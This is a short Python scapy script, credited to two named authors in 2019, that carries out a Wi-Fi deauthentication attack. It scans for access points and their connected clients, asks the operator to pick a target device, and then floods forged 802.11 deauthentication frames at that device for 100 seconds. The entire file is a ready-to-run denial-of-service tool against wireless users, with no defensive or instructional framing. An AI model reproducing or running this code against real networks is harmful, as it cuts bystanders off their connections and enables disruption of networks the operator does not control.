
#!/usr/bin/env python


# import scapy module
import scapy.all as scapy
import sys
import time



print ('''
-----------------------------------------------------------------------------------------------
__          ___  __ _       _                  _   _                _   _             _        
\ \        / (_)/ _(_)     | |                | | | |              | | | |           | |   
 \ \  /\  / / _| |_ _    __| | ___  __ _ _   _| |_| |__ ______ __ _| |_| |_ __ _  ___| | __	
  \ \/  \/ / | |  _| |  / _` |/ _ \/ _` | | | | __| '_ \______/ _` | __| __/ _` |/ __| |/ /
   \  /\  /  | | | | | | (_| |  __/ (_| | |_| | |_| | | |    | (_| | |_| || (_| | (__|   < 
    \/  \/   |_|_| |_|  \__,_|\___|\__,_|\__,_|\__|_| |_|     \__,_|\__|\__\__,_|\___|_|\_\

+-+-+-+-+-+ +-+-+-+-+-+-+-+-+ +-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+
|G|i|l|a|d| |R|o|z|m|a|r|i|n| |&| |I|s|r|a|e|l| |B|u|s|k|i|l|a|
+-+-+-+-+-+ +-+-+-+-+-+-+-+-+ +-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-------------------------------------------(c)-2019---------------------------------------------
''')



Pkt_Info = """
---------------[ Packet Captured ]-----------------------
 \033[1mAp number \033[0m {} \033[1m Ap mac \033[0m {} \033[1m AP Name \033[0m  : {} [SSID]
"""

ap_Info = """
---------------[ Device Captured ]-----------------------
 \033[1m Mac number \033[0m {} \033[1m  Mac number \033[0m {} \033[1m 
"""


# GetAPStations Function
def GetAPStation(*args,  **kwargs):
 """
 Function For Filtering Beacon Frames And Extract Access 
 Point Information From Captured Packets.

 """


 def PacketFilter(pkt):
  
   # if packet has layer Dot11Elt  Information Element and the type is 0 or 8 add the ap to list	
  if pkt.haslayer(scapy.Dot11Elt) and pkt.type == 0 and pkt.subtype == 8:
   if pkt.addr2 not in ap:
    ap.append(pkt.addr2)
    packets.append(pkt)
    
    print Pkt_Info.format(ap.index(pkt.addr2),pkt.addr2,pkt.info)

 scapy.sniff(prn=PacketFilter, *args, **kwargs)
 return (ap, packets)	
 
def sniffmgmt(p):
     # if packet has layer Dot11QoS take the Client MAC Address 
    if  (p.haslayer(scapy.Dot11QoS) and (p.addr1!="ff:ff:ff:ff:ff:ff") and (p.addr2== ap[int(apNum)]))  :
       if p.addr1 not in clients:
          clients.append(p.addr1)
          print ap_Info.format(clients.index(p.addr1),p.addr1)
     
          

   

# Main Trigger
if __name__=="__main__":

 ap=[]
 packets=[] 
 clients=[]  
#step 1 : we scan for wireless network
 raw_input(" '\033[1m' Hello and welcome to wifi deauth tool pleas press --Enter-- to start wireless network scan'\033[0m'")

 GetAPStation(iface="mon0", timeout=10)
 #step 2: chose AP to scan
 apNum = raw_input("Pleas choose Ap from list above to see all devices on  the AP \033[1m--enter Ap number--\033[0m")	
 print ("connect to: ", ap[int(apNum)])
 #step 3: we scan all devices on the AP
 scapy.sniff(iface="mon0", prn=sniffmgmt,timeout=20)
 #step 4 :chose Client MAC Address to attack
 macNum = raw_input("Pleas choose device from list above to start Wifi deauth-attack \033[1m--enter mac number from list--\033[0m")	
 print ("connect to: " ,clients[int(macNum)])

# Access Point MAC Address
 ap = ap[int(apNum)]

# Client MAC Address
 client = clients[int(macNum)]

# Deauthentication Packet For Client
#             Use This Option Only If you Have Client MAC Address
pkt1 = scapy.RadioTap()/scapy.Dot11(addr1=ap, addr2=client, addr3=client)/scapy.Dot11Deauth()

t_end = time.time() + 100 
while time.time() < t_end:

 scapy.sendp(pkt1, iface="mon0", inter=0.001)
 
raw_input(" '\033[1m'Finsih sucssesfuly! ThankYou Press --Enter to exit '\033[0m'")

